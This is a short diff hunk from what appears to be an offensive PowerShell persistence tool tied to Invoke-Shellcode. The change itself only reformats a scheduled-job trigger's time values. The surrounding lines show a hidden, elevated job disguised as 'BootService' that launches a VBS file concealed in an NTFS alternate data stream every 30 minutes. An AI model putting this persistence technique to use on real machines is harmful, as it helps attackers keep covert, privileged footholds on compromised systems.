@@ -94,7 +94,7 @@ This will execute the persistence script using Invoke-Shellcode as the payload f
     }
     else {
        $Option = New-ScheduledJobOption -RunElevated -RequireNetwork -ContinueIfGoingOnBattery -StartIfOnBattery -HideInTaskScheduler
-       $Trigger = New-JobTrigger -Once -At "07:00 AM" -RepeatIndefinitely -RepetitionInterval "00:30:00"
+       $Trigger = New-JobTrigger -Once -At 7:00AM -RepeatIndefinitely -RepetitionInterval 00:30:00
        $Script = {wscript.exe $env:USERPROFILE\AppData:$vbsFile}
        $paramHash = @{
           Name = "BootService"
